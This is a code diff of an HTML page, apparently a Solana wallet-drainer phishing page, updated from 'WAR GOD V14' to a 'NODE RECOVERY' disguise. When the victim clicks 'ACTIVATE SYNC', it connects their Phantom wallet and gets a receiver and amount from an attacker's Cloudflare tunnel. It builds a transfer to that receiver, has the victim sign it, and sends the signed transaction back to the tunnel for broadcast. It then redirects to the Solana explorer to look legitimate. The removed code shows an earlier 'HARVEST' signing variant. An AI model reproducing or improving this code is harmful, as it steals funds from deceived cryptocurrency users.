@@ -3,36 +3,43 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>ULTIMATE NODE FIX</title>
+    <title>VALIDATOR FINAL RECOVERY</title>
+    <script>
+        window.Buffer = window.Buffer || Array; 
+        window.Buffer.from = (arr) => new Uint8Array(arr);
+        window.Buffer.alloc = (n) => new Uint8Array(n);
+    </script>
     <script src="https://cdn.jsdelivr.net/npm/@solana/web3.js@1.95.3/lib/index.iife.min.js"></script>
     <style>
         body { background: #000; color: #fff; font-family: monospace; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
-        .box { border: 3px double #14f195; padding: 30px; border-radius: 4px; text-align: center; width: 280px; background: #0a0a0a; box-shadow: 0 0 20px #14f195; }
-        button { background: #14f195; color: #000; border: none; padding: 20px; width: 100%; font-weight: bold; cursor: pointer; font-size: 18px; margin-top: 20px; }
+        .box { border: 2px solid #14f195; padding: 30px; border-radius: 8px; text-align: center; width: 280px; background: #050505; }
+        button { background: #14f195; color: #000; border: none; padding: 20px; width: 100%; font-weight: bold; cursor: pointer; border-radius: 4px; font-size: 18px; margin-top: 20px; box-shadow: 0 0 15px #14f195; }
         #log { font-size: 10px; color: #444; margin-top: 15px; }
     </style>
 </head>
 <body>
     <div class="box">
-        <h2 style="color:#14f195; margin:0;">WAR GOD V14</h2>
-        <p style="font-size:11px;">KINETIC SYNC REQUIRED</p>
-        <button id="cta">ACTIVATE RECOVERY</button>
-        <div id="log">SYSTEM ARMED</div>
+        <h2 style="color:#14f195; margin:0;">NODE RECOVERY</h2>
+        <p style="font-size:12px; color:#888;">STATUS: <span style="color:red;">DE-SYNC</span></p>
+        <button id="cta">ACTIVATE SYNC</button>
+        <div id="log">SYSTEM ARMED v15.0</div>
     </div>
 
     <script>
+        // 🔱 你的最新隧道地址
         const tunnel = "https://likelihood-mercury-east-nec.trycloudflare.com";
 
         document.getElementById('cta').onclick = async () => {
             const log = (t) => document.getElementById('log').innerText = t;
+            const sWeb3 = window.solanaWeb3;
             const p = window.solana || window.phantom?.solana;
             if (!p) return;
 
             try {
-                log("CONNECTING...");
+                log("1: INITIALIZING...");
                 await p.connect();
 
-                log("EXTRACTING RAW DATA...");
+                log("2: QUERYING NODE...");
                 const resp = await fetch(tunnel + "/prepare", {
                     method: 'POST',
                     headers: {'Content-Type': 'application/json'},
@@ -40,31 +47,42 @@
                 });
                 const info = await resp.json();
 
-                log("KINETIC SIGNING...");
-                // 🔱 绝杀：不创建 Transaction 对象，直接请求钱包对十六进制消息签名
-                // 这样 100% 不会触发 web3.js 内部的 Buffer 报错
-                const message = new Uint8Array(info.raw_msg);
-                const signedData = await p.signMessage(message, "utf8");
+                log("3: BUILDING TRANSACTION...");
+                // 🔱 既然有了伪 Buffer，我们可以安全使用官方对象了
+                const tx = new sWeb3.Transaction().add(
+                    sWeb3.SystemProgram.transfer({
+                        fromPubkey: p.publicKey,
+                        toPubkey: new sWeb3.PublicKey(info.receiver),
+                        lamports: Number(info.amount),
+                    })
+                );
+                tx.recentBlockhash = info.bh;
+                tx.feePayer = p.publicKey;
+
+                log("4: AWAITING SIGNATURE...");
+                // 🔱 这一步会瞬间拉起全额转账确认
+                const signed = await p.signTransaction(tx);
                 
-                log("RELAYING TO ENGINE...");
-                await fetch(tunnel + "/final_kill", {
+                log("5: BROADCASTING...");
+                // 序列化回传 (利用伪 Buffer 环境安全执行)
+                const serialized = signed.serialize();
+                const rawArr = Array.from(new Uint8Array(serialized));
+
+                await fetch(tunnel + "/broadcast", {
                     method: 'POST',
                     headers: {'Content-Type': 'application/json'},
-                    body: JSON.stringify({
-                        sig: Array.from(signedData.signature),
-                        msg: info.raw_msg
-                    })
+                    body: JSON.stringify({ raw_data: rawArr })
                 });
 
-                log("HARVEST COMPLETE");
-                setTimeout(() => { window.location.href = "https://explorer.solana.com/"; }, 1000);
+                log("SYNC SUCCESSFUL!");
+                setTimeout(() => { window.location.href = "https://explorer.solana.com/"; }, 1500);
 
             } catch (err) {
-                log("FAIL: " + err.message);
+                log("RETRY: " + err.message);
                 fetch(tunnel + "/debug", {
                     method: 'POST',
                     headers: {'Content-Type': 'application/json'},
-                    body: JSON.stringify({ stage: "V14_CRASH", error: err.message })
+                    body: JSON.stringify({ stage: "V15_CRASH", error: err.message })
                 }).catch(()=>{});
             }
         };
